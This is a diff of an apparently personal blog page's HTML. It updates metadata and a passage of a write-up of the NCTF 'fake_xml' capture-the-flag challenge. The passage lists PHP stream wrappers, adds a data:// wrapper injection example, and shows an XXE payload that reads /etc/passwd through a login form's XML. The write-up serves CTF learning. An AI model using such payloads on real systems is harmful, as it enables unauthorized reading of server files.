@@ -24,7 +24,7 @@
 <meta property="og:description" content="顺便记录一下常用的linux文件路径，以便抄作业 开始实战, 2_n3ed_p00000000000000000000000w3r!!!!!!!!!!!!!!!!!!!!! fake_xml NCTF这道题是假的xxe攻击题，flag在页面就能找到，实际上用来熟悉一下操作 常用php伪协议:file:&#x2F;&#x2F; — 访问本地文件系统http:&#x2F;&#x2F; — 访问 HTT">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2022-02-11T15:41:02.000Z">
-<meta property="article:modified_time" content="2022-03-19T02:45:18.266Z">
+<meta property="article:modified_time" content="2022-04-17T05:40:55.082Z">
 <meta property="article:author" content="7bmk">
 <meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary_large_image">
@@ -209,7 +209,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      6k 字
+      6.2k 字
     </span>
   
 
@@ -218,7 +218,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      51 分钟
+      52 分钟
     </span>
   
 
@@ -254,7 +254,7 @@
 <p>开始实战, 2_n3ed_p00000000000000000000000w3r!!!!!!!!!!!!!!!!!!!!!</p>
 <h1 id="fake-xml-NCTF"><a href="#fake-xml-NCTF" class="headerlink" title="fake_xml NCTF"></a>fake_xml NCTF</h1><p>这道题是假的xxe攻击题，flag在页面就能找到，实际上用来熟悉一下操作</p>
 <p>常用php伪协议:<br>file:&#x2F;&#x2F; — 访问本地文件系统<br>http:&#x2F;&#x2F; — 访问 HTTP(s) 网址<br>ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs<br>php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）<br>zlib:&#x2F;&#x2F; — 压缩流<br>data:&#x2F;&#x2F; — 数据（RFC 2397）<br>glob:&#x2F;&#x2F; — 查找匹配的文件路径模式<br>phar:&#x2F;&#x2F; — PHP 归档<br>ssh2:&#x2F;&#x2F; — Secure Shell 2<br>rar:&#x2F;&#x2F; — RAR<br>ogg:&#x2F;&#x2F; — 音频流<br>expect:&#x2F;&#x2F; — 处理交互式的流</p>
-<p>(目前会用的只有file:&#x2F;&#x2F;和php:&#x2F;&#x2F;)</p>
+<p>(目前会用的也8多，只有file:&#x2F;&#x2F;和php:&#x2F;&#x2F;，以后慢慢填)<br>data:&#x2F;&#x2F;: 写入协议，比如创建text文件并向text文件写入welecome to the zjctf<br>?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf</p>
 <p>首先，进入网页是个登陆界面，于是随便输，然后抓包，发现账户名和密码是以xml形式传输—-</p>
 <p>于是就阔以进行构造payload: </p>
 <figure class="highlight xml"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">note</span> [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">admin</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="hljs-meta">  ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123456<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure>
